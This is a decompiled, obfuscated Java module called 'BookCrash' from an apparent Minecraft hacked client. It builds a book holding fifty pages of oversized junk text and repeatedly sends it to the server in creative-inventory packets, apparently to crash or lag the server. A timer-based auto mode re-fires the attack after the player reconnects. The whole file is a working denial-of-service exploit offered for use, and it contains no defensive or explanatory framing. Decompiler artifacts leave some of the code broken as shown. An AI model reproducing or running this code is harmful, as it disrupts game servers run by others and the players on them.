/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.client.Minecraft
 *  net.minecraft.init.Items
 *  net.minecraft.item.ItemStack
 *  net.minecraft.nbt.NBTBase
 *  net.minecraft.nbt.NBTTagCompound
 *  net.minecraft.nbt.NBTTagList
 *  net.minecraft.nbt.NBTTagString
 *  net.minecraft.network.Packet
 *  net.minecraft.network.play.client.CPacketCreativeInventoryAction
 */
package me.axua.impactplus.module.modules.misc;

import java.util.Timer;
import java.util.TimerTask;
import me.axua.impactplus.module.Module;
import me.axua.impactplus.module.ModuleManager;
import me.axua.impactplus.setting.Setting;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;

public class BookCrash
extends Module {
    public /* synthetic */ Setting.b Auto;
    public /* synthetic */ Setting.i AutoTurnOnDelay;
    /* synthetic */ int stop;
    public /* synthetic */ Setting.i AutoTurnOffDelay;
    private /* synthetic */ Timer _Timer;
    /* synthetic */ int once2;
    /* synthetic */ int once;

    @Override
    public void onEnable() {
        llllllllllllllllIlllIIlIlIIlIIIl.once = 0;
        llllllllllllllllIlllIIlIlIIlIIIl.once2 = 0;
        llllllllllllllllIlllIIlIlIIlIIIl.stop = 0;
    }

    @Override
    public void CoolonUpdate() {
        BookCrash llllllllllllllllIlllIIlIIlIIIIlI;
        if (llllllllllllllllIlllIIlIIlIIIIlI.stop == 3) {
            if (llllllllllllllllIlllIIlIIlIIIIlI.once == 1) {
                return;
            }
            llllllllllllllllIlllIIlIIlIIIIlI.once = 1;
            llllllllllllllllIlllIIlIIlIIIIlI._Timer.cancel();
            llllllllllllllllIlllIIlIIlIIIIlI._Timer = new Timer();
            llllllllllllllllIlllIIlIIlIIIIlI._Timer.schedule(new TimerTask(){
                {
                    1 lllllllllllllllllIIlIlIIlIIlIIlI;
                }

                @Override
                public void run() {
                    if (!ModuleManager.isModuleEnabled("BookCrash")) {
                        return;
                    }
                    lllllllllllllllllIIlIlIIlIIIIlII.BookCrash.this.stop = 0;
                    lllllllllllllllllIIlIlIIlIIIIlII.BookCrash.this.once2 = 0;
                    lllllllllllllllllIIlIlIIlIIIIlII.BookCrash.this.once = 0;
                }
            }, llllllllllllllllIlllIIlIIlIIIIlI.AutoTurnOnDelay.getValue());
        }
        if (llllllllllllllllIlllIIlIIlIIIIlI.stop == 2 && BookCrash.mc.thePlayer != null) {
            llllllllllllllllIlllIIlIIlIIIIlI.stop = 3;
        }
        if (BookCrash.mc.thePlayer == null) {
            llllllllllllllllIlllIIlIIlIIIIlI.stop = 2;
        }
        if (llllllllllllllllIlllIIlIIlIIIIlI.stop == 0) {
            ItemStack llllllllllllllllIlllIIlIIlIIllIl = new ItemStack(Items.writable_book);
            NBTTagList llllllllllllllllIlllIIlIIlIIlIll = new NBTTagList();
            NBTTagCompound llllllllllllllllIlllIIlIIlIIlIIl = new NBTTagCompound();
            String llllllllllllllllIlllIIlIIlIIIllI = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
            for (int llllllllllllllllIlllIIlIIlIlIIlI = 0; llllllllllllllllIlllIIlIIlIlIIlI < 50; ++llllllllllllllllIlllIIlIIlIlIIlI) {
                String llllllllllllllllIlllIIlIIlIlIlll = llllllllllllllllIlllIIlIIlIIIllI;
                NBTTagString llllllllllllllllIlllIIlIIlIlIlIl = new NBTTagString(llllllllllllllllIlllIIlIIlIlIlll);
                llllllllllllllllIlllIIlIIlIIlIll.appendTag((NBTBase)llllllllllllllllIlllIIlIIlIlIlIl);
            }
            llllllllllllllllIlllIIlIIlIIlIIl.setString("author", "popbob");
            llllllllllllllllIlllIIlIIlIIlIIl.setString("title", "I love fortnite");
            llllllllllllllllIlllIIlIIlIIlIIl.setTag("pages", (NBTBase)llllllllllllllllIlllIIlIIlIIlIll);
            llllllllllllllllIlllIIlIIlIIllIl.setTagInfo("pages", (NBTBase)llllllllllllllllIlllIIlIIlIIlIll);
            llllllllllllllllIlllIIlIIlIIllIl.setTagCompound(llllllllllllllllIlllIIlIIlIIlIIl);
            for (int llllllllllllllllIlllIIlIIlIlIIII = 0; llllllllllllllllIlllIIlIIlIlIIII < 100; ++llllllllllllllllIlllIIlIIlIlIIII) {
                try {
                    Minecraft.getMinecraft().getNetHandler().addToSendQueue((Packet)new CPacketCreativeInventoryAction(0, llllllllllllllllIlllIIlIIlIIllIl));
                    continue;
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }
        if (llllllllllllllllIlllIIlIIlIIIIlI.Auto.getValue()) {
            if (llllllllllllllllIlllIIlIIlIIIIlI.once2 == 1) {
                return;
            }
            llllllllllllllllIlllIIlIIlIIIIlI.once2 = 1;
            llllllllllllllllIlllIIlIIlIIIIlI._Timer.cancel();
            llllllllllllllllIlllIIlIIlIIIIlI._Timer = new Timer();
            llllllllllllllllIlllIIlIIlIIIIlI._Timer.schedule(new TimerTask(){
                {
                    2 llllllllllllllllIIlIllllIIlIlIlI;
                }

                @Override
                public void run() {
                    if (!ModuleManager.isModuleEnabled("BookCrash")) {
                        return;
                    }
                    llllllllllllllllIIlIllllIIlIIlIl.BookCrash.this.stop = 1;
                }
            }, llllllllllllllllIlllIIlIIlIIIIlI.AutoTurnOffDelay.getValue());
        }
    }

    public BookCrash() {
        super("BookCrash", Module.Category.MISC, "BookCrash");
        BookCrash llllllllllllllllIlllIIlIlIIlllIl;
        llllllllllllllllIlllIIlIlIIlllIl._Timer = new Timer();
    }

    @Override
    public void setup() {
        BookCrash llllllllllllllllIlllIIlIlIIlIlII;
        llllllllllllllllIlllIIlIlIIlIlII.Auto = llllllllllllllllIlllIIlIlIIlIlII.registerB("Auto", false);
        llllllllllllllllIlllIIlIlIIlIlII.AutoTurnOffDelay = llllllllllllllllIlllIIlIlIIlIlII.registerI("OffDelay", 5000, 5000, 30000);
        llllllllllllllllIlllIIlIlIIlIlII.AutoTurnOnDelay = llllllllllllllllIlllIIlIlIIlIlII.registerI("OnDelay", 5000, 5000, 30000);
    }
}

